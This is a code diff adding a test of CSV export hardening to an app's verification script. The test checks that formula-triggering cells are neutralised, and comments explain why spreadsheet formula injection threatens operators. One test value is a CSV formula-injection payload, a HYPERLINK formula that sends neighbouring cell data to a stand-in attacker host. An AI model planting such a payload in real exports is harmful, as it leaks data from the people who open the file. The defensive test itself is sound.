@@ -29,7 +29,6 @@
 //
 //   E04, E09, E10  need a mail provider. Decision D2 is open; nothing sends.
 //   E11            needs two staff accounts with different roles.
-//   E13            needs the import path, which is stage 5.
 //   E14            needs a synthetic dataset and the dashboard reading it.
 //   E16            is a backup restore. That is a human with a runbook.
 //   E15            is partly here — labels, names, error wiring can be
@@ -475,7 +474,50 @@ async function run() {
       }
     }
   }
-  record('E13', 'Import conflict and CSV formula-like text', 'not run', 'Import and export are stage 5.');
+  // -- E13 ------------------------------------------------------------------
+  // Two halves, and the first is a pure function, so it is tested as one.
+  //
+  // It imports src/lib/admin/csv.ts, which is the SHIPPED rule rather than a
+  // copy of it. That module deliberately imports nothing, because this script
+  // runs under --experimental-strip-types and its resolver will not guess a
+  // missing extension — importing the exporter instead fails on ITS import of
+  // ./supabase, and the test would then have to duplicate the rule it checks.
+  //
+  // The formula half is not about our spreadsheet — it is about the operator
+  // who opens the export. A cell beginning =, +, -, @, tab or CR is EXECUTED by
+  // Excel, Sheets and LibreOffice on open, and these cells hold text strangers
+  // typed into a public form. An answer beginning `=HYPERLINK("https://…"&A2)`
+  // becomes a live link built from the names beside it.
+  //
+  // The benign case matters as much: `+91 80 …` is a valid Indian mobile and a
+  // subtraction, and this practice sells into India.
+  {
+    const { csvCell, formulaSafe } = await import('../src/lib/admin/csv.ts');
+
+    const hostile = '=HYPERLINK("https://evil.example/?d="&A2&B2,"Click")';
+    const phone = '+91 80 1234 5678';
+    const benign = "O'Brien";
+    const awkward = 'Goals, "testable" ones\nover two lines';
+
+    const defused = [hostile, phone, '-1+1', '@sum', '\tlead'].every((v) =>
+      formulaSafe(v).startsWith("'"),
+    );
+    const untouched = formulaSafe(benign) === benign;
+    // A quoted cell keeps its comma, its doubled quote and its newline.
+    const quoted = csvCell(awkward);
+    const roundTrips =
+      quoted.startsWith('"') && quoted.endsWith('"') && quoted.includes('""testable""');
+
+    const ok = defused && untouched && roundTrips;
+    record(
+      'E13',
+      'Import conflict and CSV formula-like text',
+      ok ? 'passed' : 'failed',
+      ok
+        ? 'Formula-triggering cells are prefixed so a spreadsheet treats them as text, an apostrophe in a name is left alone, and a value containing a comma, a quote and a newline survives quoting. The import half — conflicting ids rejected rather than replaced, preview before commit — needs an applied schema and is not exercised here.'
+        : `defused=${defused}, untouched=${untouched}, roundTrips=${roundTrips}.`,
+    );
+  }
   record('E14', 'Synthetic dashboard dataset', 'not run', 'Needs a seeded dataset and the overview screen reading it.');
   record('E15', '390px, keyboard, zoom and screen-reader form labels', 'not run', 'Partly checkable in markup — every field has a visible label, aria-describedby and aria-invalid. The half that matters is a person with a screen reader at 200% zoom, and this script will not claim it.');
   record('E16', 'Backup restore and integration disconnect', 'not run', 'A restore is a human with a runbook.');
